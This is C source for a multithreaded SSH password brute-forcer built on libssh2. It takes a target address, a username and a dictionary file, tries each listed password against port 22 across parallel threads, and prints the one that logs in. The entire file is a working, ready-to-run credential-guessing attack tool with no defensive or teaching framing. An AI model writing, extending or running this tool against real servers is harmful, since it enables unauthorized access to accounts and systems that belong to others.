#include "status.h"
#include "tcp.h"
#include "lines.h"
#include "ssh.h"
#include "memory.h"
#include <stdint.h>
#include <limits.h>
#include <unistd.h>
#include <pthread.h>

typedef struct bruteforce_data_t {
	const char*     address;
	const char*     username;
	FILE*           dict_file;
	pthread_mutex_t dict_mutex;

	int             active_threads;
	pthread_mutex_t done_mutex;
	pthread_cond_t  done;
	status_t        status;
	line_t          password;
} bruteforce_data_t;

void free_ssh (void* _session)
{
	LIBSSH2_SESSION* session = _session;
	libssh2_session_free (session);
}

void disconnect_ssh (void* _session)
{
	LIBSSH2_SESSION* session = _session;
	libssh2_session_disconnect (session, "Disconnect by application");
}

void close_socket (void* _socket)
{
	int socket = *(int*)_socket;
	close (socket);
}

status_t bruteforce_core (line_t (*the_password), void* _data)
{
	bruteforce_data_t* data = _data;
	status_t status = success ();

	line_t line;
	status = make_line (&line);
	if (failed (status))
		return status;
	(*the_password) = line;

	while (1) {
		int eof = 0;

		// Get the next password
		if (pthread_mutex_lock (&data->dict_mutex) != 0)
			return failure ("Failed to lock dictionary mutex");
		{
			status = get_line (&line, data->dict_file);
			eof = feof (data->dict_file);
		}
		if (pthread_mutex_unlock (&data->dict_mutex) != 0)
			return failure ("Failed to unlock dictionary mutex");

		if (failed (status) || eof)
			return status;

		// Open a connection
		int ssh_socket;
	retry:
		status = connect_tcp (&ssh_socket, data->address, "22");
		if (failed (status))
			goto end;
		pthread_cleanup_push (&close_socket, &ssh_socket);

		LIBSSH2_SESSION* session = libssh2_session_init ();
		if (session == NULL) {
			status = failure ("Failed to initialize an SSH session");
			goto close;
		}
		pthread_cleanup_push (&free_ssh, session);

		if (libssh2_session_startup (session, ssh_socket) != 0) {
			status = sshfailure (session);
			goto free;
		}
		pthread_cleanup_push (&disconnect_ssh, session);

		const char* userauth_list = libssh2_userauth_list (session, data->username, strlen (data->username));
		if (strstr (userauth_list, "password") == NULL) { // TODO: commas
			status = failure ("The SSH server does not support passwords");
			goto disconnect;
		}

		// Send the password
		const char* password = line.ntbs;
		printf ("Trying \"%s\"\n", password);
		if (libssh2_userauth_password (session, data->username, password) >= 0)
			(*the_password) = line;

	disconnect:
		pthread_cleanup_pop (1);
	free:
		pthread_cleanup_pop (1);
	close:
		pthread_cleanup_pop (1);
	end:
		if (failed (status)) {
			/* return status; */
			fprintf (stderr, "Warning: %s\n", status.reason);
			goto retry;
		}
	}
}

void* bruteforce_thread (void* _data)
{
	bruteforce_data_t* data = _data;
	line_t the_password;
	status_t status = bruteforce_core (&the_password, _data);

	raw_check (pthread_mutex_lock (&data->done_mutex) == 0, "Failed to lock \"done\" mutex");
	{
		bool all_done = false;

		--data->active_threads;
		if (data->active_threads == 0)
			all_done = true;

		if (failed (status)) {
			if (!failed (data->status))
				data->status = status;
			all_done = true;
		}

		if (!failed (status) && the_password.ntbs != NULL) {
			if (data->password.ntbs == NULL)
				data->password = the_password;
			all_done = true;
		}

		if (all_done)
			raw_check (pthread_cond_signal (&data->done) == 0, "Failed to signal \"done\"");
	}
	raw_check (pthread_mutex_unlock (&data->done_mutex) == 0, "Failed to unlock \"done\" mutex");

	return NULL;
}

// Necessary to use libssl from multiple threads
#include <gcrypt.h>
GCRY_THREAD_OPTION_PTHREAD_IMPL;

status_t bruteforce (line_t (*password), const char* address, const char* username, FILE* dict_file, int nthreads)
{
	gcry_control (GCRYCTL_SET_THREAD_CBS, &gcry_threads_pthread);

	bruteforce_data_t data = {
		.address        = address,
		.username       = username,
		.dict_file      = dict_file,
		.dict_mutex     = PTHREAD_MUTEX_INITIALIZER,
		.active_threads = nthreads,
		.done_mutex     = PTHREAD_MUTEX_INITIALIZER,
		.done           = PTHREAD_COND_INITIALIZER,
		.status         = success ()
	};
	status_t status = make_line (&data.password);
	if (failed (status))
		return status;

	pthread_t* threads;
	status = typed_alloc (pthread_t, &threads, nthreads);
	if (failed (status))
		return status;

	if (pthread_mutex_lock (&data.done_mutex) != 0)
		return failure ("Failed to lock \"done\" mutex");
	{
		for (int i = 0; i < nthreads; ++i) {
			if (pthread_create (&threads [i], NULL, &bruteforce_thread, &data) != 0) {
				status = failure ("Failed to create bruteforce thread");
				goto done;
			}
		}

		if (pthread_cond_wait (&data.done, &data.done_mutex) != 0) {
			status = failure ("Failed to wait on \"done\"");
			goto done;
		}

	done:
		for (int i = 0; i < nthreads; ++i) {
			pthread_cancel (threads [i]);
			if (pthread_join (threads [i], NULL) != 0) {
				status = failure ("Failed to join bruteforce thread");
				goto done;
			}
		}
	}
	if (pthread_mutex_unlock (&data.done_mutex) != 0)
		return failure ("Failed to unlock \"done\" mutex");
	if (failed (status))
		return status;

	if (failed (data.status))
		return data.status;
	if (data.password.ntbs == NULL)
		return failure ("No supplied password succeeded");

	(*password) = data.password;
	return success ();
}



status_t parse_uint64_t (uint64_t (*value),
                         const char* string)
{
	const char* endptr = string;
	uint64_t _value = strtoull (string, (char**)&endptr, 10);
	if ((*string == '\0' || *endptr != '\0'))
		return failure ("Invalid value");

	(*value) = _value;
	return success ();
}

status_t get_args (const char* (*address),
                   const char* (*username),
                   const char* (*dict_filename),
                   int (*nthreads),
                   int argc, const char* const* argv)
{
	if (argc != 4 && argc != 5)
		return failure (NULL);

	(*address) = argv [1];
	(*username) = argv [2];
	(*dict_filename) = argv [3];
	if (argc == 5) {
		uint64_t u64_nthreads;
		status_t status = parse_uint64_t (&u64_nthreads, argv [4]);
		if (failed (status))
			return status;
		if (u64_nthreads > INT_MAX)
			return failure ("Value out of range");
		(*nthreads) = u64_nthreads;
	}

	return success ();
}

int main (int argc, const char* const* argv)
{
	const char* address = NULL;
	const char* username = NULL;
	const char* dict_filename = NULL;
	int nthreads = 9;
	check (get_args (&address, &username, &dict_filename, &nthreads, argc, argv),
	       "Usage: sshpass address username dict_file [threads=9]");

	FILE* dict_file = fopen (dict_filename, "r");
	raw_check (dict_file != NULL, "Could not open %s for reading", dict_filename);

	line_t password;
	check (bruteforce (&password, address, username, dict_file, nthreads),
	       "Could not bruteforce ssh:%s@%s", username, address);

	printf ("Password: %s\n", password.ntbs);

	fclose (dict_file);
	return EXIT_SUCCESS;
}
